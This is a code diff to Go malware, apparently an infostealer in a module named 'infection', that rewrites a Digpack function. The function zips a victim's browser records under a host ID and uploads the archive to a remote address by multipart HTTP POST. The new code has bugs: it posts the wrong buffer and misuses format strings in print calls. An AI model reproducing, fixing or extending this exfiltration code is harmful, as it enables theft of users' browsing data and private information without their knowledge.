@@ -3,11 +3,13 @@ package browser
 import (
 	"archive/zip"
 	"bytes"
-	"github.com/parnurzeal/gorequest"
+	"fmt"
 	"infection/machineinfo"
 	"io"
 	"io/ioutil"
 	"log"
+	"mime/multipart"
+	"net/http"
 	"os"
 	"os/user"
 	"time"
@@ -83,26 +85,51 @@ func Digpack(addr string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	f, err := os.OpenFile(safe_path+"log"+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
+	f, err := os.OpenFile(safe_path+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
 	if err != nil {
 		log.Fatal(err)
 	}
 	buf.WriteTo(f)
-	var Msg = msg{
-		Hostid: versionDetail.Hostid,
+	pbuf := new(bytes.Buffer)
+	writer := multipart.NewWriter(pbuf)
+	formFile, err := writer.CreateFormFile("file", versionDetail.Hostid+".zip")
+	if err != nil {
+		log.Println("Create form file failed: %s\n", err)
 	}
-	var bizStatusResponse = BizStatusResponse{}
-	resp, _, _ := gorequest.New().
-		Type("multipart").
-		Post(addr).
-		Send(Msg).
-		SendFile(safe_path + "log" + versionDetail.Hostid + ".zip").
-		EndStruct(&bizStatusResponse)
-	if resp.StatusCode == 200 && bizStatusResponse.Succeed {
+	// 从文件读取数据，写入表单
+	srcFile, err := os.Open(safe_path + versionDetail.Hostid + ".zip")
+	if err != nil {
+		fmt.Println("Open source file failed: s\n", err)
+	}
+	defer srcFile.Close()
+	_, err = io.Copy(formFile, srcFile)
+	if err != nil {
+		fmt.Println("Write to form file falied: %s\n", err)
+	}
+	// 发送表单
+	contentType := writer.FormDataContentType()
+	writer.Close()
+	re, err := http.Post(addr, contentType, buf)
+	if re.StatusCode == 200 {
 		log.Println("Upload browser record Status Successful !")
 	} else {
 		log.Println("Upload browser record Status Fail !")
 	}
+	//var Msg = msg{
+	//	Hostid: versionDetail.Hostid,
+	//}
+	//var bizStatusResponse = BizStatusResponse{}
+	//resp, _, _ := gorequest.New().
+	//	Type("multipart").
+	//	Post(addr).
+	//	Send(Msg).
+	//	SendFile(safe_path + "log" + versionDetail.Hostid + ".zip").
+	//	EndStruct(&bizStatusResponse)
+	//if resp.StatusCode == 200 && bizStatusResponse.Succeed {
+	//	log.Println("Upload browser record Status Successful !")
+	//} else {
+	//	log.Println("Upload browser record Status Fail !")
+	//}
 }
 
 //returns Current working dir
